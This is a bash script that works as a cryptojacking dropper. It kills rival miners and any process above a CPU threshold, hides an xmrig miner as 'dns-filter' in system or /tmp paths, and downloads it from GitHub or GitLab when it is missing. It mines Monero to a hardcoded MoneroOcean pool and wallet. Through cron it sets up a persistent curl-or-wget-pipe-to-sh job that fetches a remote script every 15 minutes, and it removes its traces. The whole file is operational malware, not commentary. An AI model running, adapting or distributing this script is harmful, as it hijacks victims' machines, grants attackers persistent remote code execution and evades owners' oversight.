#!/bin/bash
for file in /tmp/usr/lib/systemdev/dns-filter /usr/lib/systemdev/dns-filter /usr/lib/dev/systemdev/dns-filter; do
    if [ -f "$file" ]; then
        rm -f "$file"
    fi
done

if systemctl is-active --quiet systemd_s; then
    systemctl stop systemd_s
fi

kill_unwanted() {
    if command -v pkill >/dev/null 2>&1; then
        pkill -f "index.js"
        pkill "xmr"
    elif command -v pgrep >/dev/null 2>&1; then
        pgrep -f "index.js" | xargs -r kill
        pgrep -x "xmr" | xargs -r kill
    else
        ps aux | grep '[x]mr' | awk '{print $2}' | xargs -r kill
        ps aux | grep -w '[i]ndex.js' | awk '{print $2}' | xargs -r kill
    fi
    if command -v pgrep >/dev/null 2>&1; then
        pgrep "index.js" | grep -v "^$$$" | xargs -r kill
    else
        ps aux | grep -w '[i]ndex.js' | awk -v mypid=$$ '$2 != mypid {print $2}' | xargs -r kill
    fi
}
kill_unwanted

kill_high_cpu_processes() {
    local threshold=150.0
    local exclude_patterns=("reservepattern454545")
    local pid cpu cmdline
    ps -eo pid,%cpu --sort=-%cpu | awk -v threshold="$threshold" \
        'NR>1 && $2 > threshold {print $1}' | while read -r pid; do
        if [ -f "/proc/$pid/cmdline" ]; then
            cmdline=$(tr '\0' ' ' < "/proc/$pid/cmdline")
        else
            echo "PID $pid died before inspection"
            continue
        fi
        for pattern in "${exclude_patterns[@]}"; do
            if [[ "$cmdline" == *"$pattern"* ]]; then
                echo "Excluding PID $pid (matched '$pattern')"
                continue 2
            fi
        done
        if kill -9 "$pid" 2>/dev/null; then
            echo "Killed PID $pid (CPU: $(ps -p "$pid" -o %cpu --no-headers)%)"
        else
            echo "Failed to kill PID $pid (already dead or permission denied)"
        fi
    done
}

if [ "$(id -u)" -eq 0 ]; then
    HOME_1='/usr/lib/dev'
    user_type="root"
    if ! command -v cron &>/dev/null; then
        echo "Installing cron for root user..."
        if command -v apt-get &>/dev/null; then
            apt-get update && apt-get install -y cron
        elif command -v yum &>/dev/null; then
            yum install -y cronie
        else
            echo "no cronieL"
        fi
    fi
else
    HOME_1='/tmp/usr/lib'
    user_type="user"
fi

mkdir -p "$HOME_1/systemdev"
program_file="$HOME_1/systemdev/dns-filter"

run_program() {
    local executable="$program_file"
    local fallback_executable="/tmp/dns"
    local download_url="https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static"

    launch_program() {
        nohup "$@" >/dev/null 2>&1 &
        local pid=$!
        sleep 0.5
        if ! ps -p "$pid" >/dev/null 2>&1; then
            return 1
        fi
        sleep 4.5
        ps -p "$pid" >/dev/null 2>&1
    }

    download_fallback() {
        rm -f "$fallback_executable"
        if command -v curl >/dev/null 2>&1; then
            curl -k -fL -o "$fallback_executable" "$download_url" || return 1
        elif command -v wget >/dev/null 2>&1; then
            wget -qO "$fallback_executable" "$download_url" || return 1
        else
            echo "No download tool available" >&2
            return 1
        fi
        chmod +x "$fallback_executable"
    }

    echo "Starting primary program..."
    if [ -x "$executable" ]; then
        if launch_program "$executable" -o gulf.moneroocean.stream:20128 \
            -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 \
            reservepattern454545; then
            echo "Primary program running (PID $!)"
            return 0
        else
            echo "Primary program crashed immediately"
        fi
    else
        echo "Primary program not found/executable"
    fi

    echo "Attempting fallback..."
    if download_fallback && launch_program "$fallback_executable" -o gulf.moneroocean.stream:20128 \
        -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 \
        reservepattern454545; then
        echo "Fallback program running (PID $!)"
    else
        echo "Warning: All startup attempts failed - continuing script anyway"
    fi
    return 0
}

if [ -e "$program_file" ]; then
    echo "Program file already exists at: $program_file"
    run_program
    pkill -f "systemd-t"
else
    if command -v wget &> /dev/null; then
        wget -qO "$HOME_1/systemdev/yes.tar.xz" "https://gh-proxy.com/https://github.com/el3ctr0wqw1/xmrig-vrl2/releases/download/main/xmrig-vrl"
    elif command -v curl &> /dev/null; then
        curl -k -L -o "$HOME_1/systemdev/yes.tar.xz" "https://gh-proxy.com/https://github.com/el3ctr0wqw1/xmrig-vrl2/releases/download/main/xmrig-vrl"
    else
        echo "Error: Neither wget nor curl is available. Please install one of them."
        exit 1
    fi

    mv "$HOME_1/systemdev/yes.tar.xz" "$program_file"
    rm -rf "$HOME_1/systemdev/xmrig"
    chmod +x "$program_file"

    if [ -x "$program_file" ]; then
        echo "Program file downloaded and installed at: $program_file"
        run_program
    else
        echo "Error: File not found or not executable at $program_file."
    fi
fi

create_cronjob() {
    local cron_command
    if command -v curl >/dev/null; then
        cron_command="/bin/sh -c 'curl -fsSLk $1 | tr -d '\''\\r'\'' | /bin/sh'"
    elif command -v wget >/dev/null; then
        cron_command="/bin/sh -c 'wget -qO- $1 | tr -d '\''\\r'\'' | /bin/sh'"
    else
        log "Error: Cannot create cron job, neither curl nor wget is available."
        return 1
    fi
    (crontab -l 2>/dev/null | grep -vF "$1"; echo "*/15 * * * * $cron_command") | crontab -
    log "Cron job successfully configured."
}

create_cronjob "https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/mon2.sh"

rm -f /tmp/mon.sh /tmp/run.sh /tmp/run2.sh
